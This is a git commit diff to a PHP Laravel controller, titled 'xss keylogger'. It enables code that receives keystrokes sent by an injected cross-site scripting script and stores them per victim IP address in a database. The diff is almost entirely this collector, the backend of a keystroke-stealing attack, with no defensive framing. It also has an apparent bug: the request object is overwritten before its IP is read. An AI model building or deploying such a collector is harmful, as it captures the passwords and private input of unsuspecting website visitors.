5dd8916de219afbe86e13d987129cdbd7c5f1a92
Duy Nguyen <duy210697@gmail.com>
2019-03-03 02:15:32 +0700

    2019-03-03: xss keylogger

--- app/Http/Controllers/XssController.php
+++ app/Http/Controllers/XssController.php
@@ -11,16 +11,18 @@ class XssController extends Controller
     function index(Request $request) {
         $keyLogger = KeyLogger::where('ip', $request->ip())->first();
         $request = json_decode($request->getContent());
-//        if ($keyLogger != null) {
-//            $keyLogger->content .= $request->key;
-//            $keyLogger->save();
-//        } else {
-//            $keyLogger = KeyLogger::create([
-//                'ip' => $request->ip(),
-//                'content' => $request->key
-//            ]);
-//        }
-        return $request;
+        if ($keyLogger != null) {
+            $keyLogger->content .= $request->key;
+            $keyLogger->save();
+        } else {
+            $keyLogger = KeyLogger::create([
+                'ip' => $request->ip(),
+                'content' => $request->key
+            ]);
+        }
+        return response()->json([
+            'response' => $request
+        ]);
     }
 
     function home(Request $request) {
